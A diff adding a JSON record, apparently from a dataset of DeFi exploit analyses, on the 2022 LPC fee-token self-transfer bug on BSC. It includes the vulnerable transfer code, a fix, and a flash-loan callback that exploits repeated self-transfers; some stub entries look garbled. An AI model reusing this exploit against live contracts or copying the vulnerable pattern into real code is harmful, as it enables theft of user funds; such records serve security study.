@@ -1,0 +1,30 @@
+{
+ "id": "2022__2022-07-25_LPC_FeeTokenSelfTransfer",
+ "source_file": "2022/2022-07-25_LPC_FeeTokenSelfTransfer.md",
+ "title": "LPC — Fee Token Self-Transfer Vulnerability Analysis",
+ "date": "2022-07-25",
+ "protocol": "LPC Token",
+ "chain": "BSC",
+ "loss_raw": "178 BNB (~$45,715)",
+ "loss_usd": 45715.0,
+ "root_cause": "Balance infinite-growth bug when fee token `transfer()` is called with self as recipient",
+ "attack_tx": "0x0e970ed8...",
+ "vulnerable_contract": "0x1e813fA0...",
+ "classes": [
+  "defl-tax-token",
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable code — no self-transfer handling\nfunction _transfer(address from, address to, uint256 amount) internal {\n    uint256 fee = amount * feeRate / 10000;\n    uint256 netAmount = amount - fee;\n\n    _balances[from] -= amount;  // deduct from sender balance\n    _balances[to] += netAmount; // increase recipient balance (fee excluded)\n\n    // When self-transfer (from == to):\n    // from balance: deducted by amount\n    // to balance: increased by netAmount\n    // Result: balance increases by fee! (balance grows with every self-transfer)\n}\n\n//",
+  "// ❌ Root cause: balance infinite-growth bug when fee token `transfer()` is called with self as recipient\n    function transfer(address arg0, uint256 arg1) external {}  // 0xa9059cbb  // ❌ vulnerability",
+  "// ❌ Root cause: balance infinite-growth bug when fee token `transfer()` is called with self as recipient\n    function transfer_attention_tg_invmru_6e7aa58(bool arg0, address arg1, address arg2) external {}  // ❌ vulnerability"
+ ],
+ "code_after": [
+  "✅ Fixed code\nfunction _transfer(address from, address to, uint256 amount) internal {\n    require(from != to, \"Self-transfer not allowed\"); // block self-transfer\n    // or\n    if (from == to) return; // ignore self-transfer\n}"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1] Flash loan from PancakeSwap (full LPC reserve)\n  │      └─ pancakeCall() callback executed\n  │\n  ├─[2] Inside flash loan callback:\n  │      ├─ Check LPC balance\n  │      └─ 10x repeated self-transfer\n  │           IERC20(LPC).transfer(address(this), LPC_balance)\n  │           balance increases with each iteration\n  │\n  ├─[3] Repay flash loan (principal + fee)\n  │\n  └─[4] Swap remaining LPC for USDT to realize profit",
+  "function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n    // Check LPC balance borrowed via flash loan\n    uint256 LPC_balance = IERC20(LPC).balanceOf(address(this));\n\n    // [Core vulnerability exploitation] 10x repeated self-transfer\n    // Each transfer leaves the fee in the balance, growing total balance\n    for (uint8 i; i < 10; ++i) {\n        IERC20(LPC).transfer(address(this), LPC_balance);\n        // balance after self-transfer > previous balance (increases by fee amount)\n    }\n\n    // Repay flash loan (principal + 10% fee)\n    uint256 paybackAmount = amount0 / 90 / 100 * 10_000;\n    IERC20(LPC).transfer(address(pancakePair), paybackAmount);\n\n    // Obtain USDT with remaining LPC (separate transaction)\n}"
+ ]
+}
